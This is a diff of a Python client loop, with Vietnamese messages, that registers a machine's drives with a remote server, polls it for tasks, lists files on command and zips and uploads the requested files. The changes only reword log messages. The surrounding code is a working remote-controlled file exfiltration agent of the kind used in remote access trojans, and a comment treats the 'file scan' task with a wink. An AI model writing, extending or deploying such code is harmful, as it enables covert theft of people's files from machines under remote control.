@@ -126,10 +126,10 @@ def main_loop():
     try:
         drives = get_drive_letters()
         if drives:
-            print(f"Đã tìm thấy các ổ cứng: {drives}. Gửi lên server...")
+            print(f"đã tìm thấy các ổ cứng: {drives}. đang gửi lên server...")
             requests.post(f"{SERVER_URL}/register_client", json={"drives": drives})
     except requests.exceptions.RequestException as e:
-        print(f"Không thể kết nối tới server lúc khởi động: {e}")
+        print(f"không thể connect tới server lúc khởi động: {e}")
         # chờ một lúc rồi thử lại
         time.sleep(30) 
         return
@@ -142,16 +142,16 @@ def main_loop():
             task = response.json()
 
             if task:
-                print(f"Nhận được tác vụ mới: {task}")
+                print(f"lấy được tác vụ mới: {task}")
                 
                 # thực hiện tác vụ "quét file" :))
                 if task.get("task") == "list_files":
                     drive_to_scan = task.get("path")
                     files = list_files_in_drive(drive_to_scan)
                     payload = {"drive": drive_to_scan, "files": files}
-                    print("Đang gửi danh sách file lên server...")
+                    print("danh sách file lên server đang đc gửi...")
                     requests.post(f"{SERVER_URL}/upload_file_list", json=payload)
-                    print("Gửi thành công.")
+                    print("thành công trong việc gửi lên btw")
 
                 # thực hiện tác vụ "gửi file"
                 elif task.get("task") == "send_file":
@@ -165,18 +165,18 @@ def main_loop():
                         with open(zip_path, 'rb') as f:
                             files = {'file': (os.path.basename(zip_path), f)}
                             requests.post(f"{SERVER_URL}/upload_file", files=files)
-                        print("Gửi file thành công.")
+                        print("gửi file thành công btw")
                         
                         # Xóa file zip tạm
                         os.remove(zip_path)
                     else:
-                        print("Không thể tạo file zip để gửi.")
+                        print("file zip để gửi không thể tạo (có thể do sự cố à?)")
 
             # Chờ trước khi hỏi lại
             time.sleep(POLL_INTERVAL)
 
         except requests.exceptions.RequestException as e:
-            print(f"bug kết nối tới server: {e}. Sẽ thử lại sau {POLL_INTERVAL} giây.")
+            print(f"bug kết nối tới server: {e}. sẽ retry sau tầm {POLL_INTERVAL} giây.")
             time.sleep(POLL_INTERVAL)
         except Exception as e:
             print(f"đã xảy ra lỗi không xác định: {e}")
